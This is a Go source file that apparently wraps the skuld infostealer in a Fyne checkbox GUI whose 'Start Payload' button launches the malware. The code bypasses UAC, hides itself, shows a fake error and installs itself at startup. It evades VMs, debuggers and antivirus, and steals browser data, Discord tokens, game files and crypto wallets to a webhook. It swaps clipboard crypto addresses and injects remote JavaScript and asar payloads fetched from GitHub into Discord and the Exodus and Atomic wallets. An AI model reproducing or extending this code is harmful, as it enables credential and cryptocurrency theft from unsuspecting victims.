package main

import (
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"

	"github.com/hackirby/skuld/modules/antidebug"
	"github.com/hackirby/skuld/modules/antivm"
	"github.com/hackirby/skuld/modules/antivirus"
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/clipper"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/discordinjection"
	"github.com/hackirby/skuld/modules/fakeerror"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/hideconsole"
	"github.com/hackirby/skuld/modules/startup"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/uacbypass"
	"github.com/hackirby/skuld/modules/wallets"
	"github.com/hackirby/skuld/modules/walletsinjection"
	"github.com/hackirby/skuld/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "",
		"cryptos": map[string]string{
			"BTC":  "",
			"BCH":  "",
			"ETH":  "",
			"XMR":  "",
			"LTC":  "",
			"XCH":  "",
			"XLM":  "",
			"TRX":  "",
			"ADA":  "",
			"DASH": "",
			"DOGE": "",
		},
	}

	a := app.New()
	w := a.NewWindow("Module Selector")

	// Checkbox'ları tanımla
	modAntivm := widget.NewCheck("AntiVM", nil)
	modAntidebug := widget.NewCheck("AntiDebug", nil)
	modAntivirus := widget.NewCheck("AntiVirus", nil)
	modBrowsers := widget.NewCheck("Browsers", nil)
	modTokens := widget.NewCheck("Tokens", nil)
	modDiscodes := widget.NewCheck("Discodes", nil)
	modClipper := widget.NewCheck("Clipper", nil)
	modCommonfiles := widget.NewCheck("CommonFiles", nil)
	modGames := widget.NewCheck("Games", nil)
	modWallets := widget.NewCheck("Wallets", nil)

	runButton := widget.NewButton("Start Payload", func() {
		go uacbypass.Run()
		go hideconsole.Run()
		program.HideSelf()

		go fakeerror.Run()
		go startup.Run()

		if modAntivm.Checked {
			go antivm.Run()
		}
		if modAntidebug.Checked {
			go antidebug.Run()
		}
		if modAntivirus.Checked {
			go antivirus.Run()
		}
		if modBrowsers.Checked {
			go browsers.Run(CONFIG["webhook"].(string))
		}
		if modTokens.Checked {
			go tokens.Run(CONFIG["webhook"].(string))
		}
		if modDiscodes.Checked {
			go discodes.Run(CONFIG["webhook"].(string))
		}
		if modClipper.Checked {
			go clipper.Run(CONFIG["cryptos"].(map[string]string))
		}
		if modCommonfiles.Checked {
			go commonfiles.Run(CONFIG["webhook"].(string))
		}
		if modGames.Checked {
			go games.Run(CONFIG["webhook"].(string))
		}
		if modWallets.Checked {
			go wallets.Run(CONFIG["webhook"].(string))
		}

		go discordinjection.Run(
			"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
			CONFIG["webhook"].(string),
		)
		go walletsinjection.Run(
			"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
			"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
			CONFIG["webhook"].(string),
		)
	})

	w.SetContent(container.NewVBox(
		modAntivm, modAntidebug, modAntivirus,
		modBrowsers, modTokens, modDiscodes,
		modClipper, modCommonfiles, modGames, modWallets,
		runButton,
	))

	w.ShowAndRun()
}
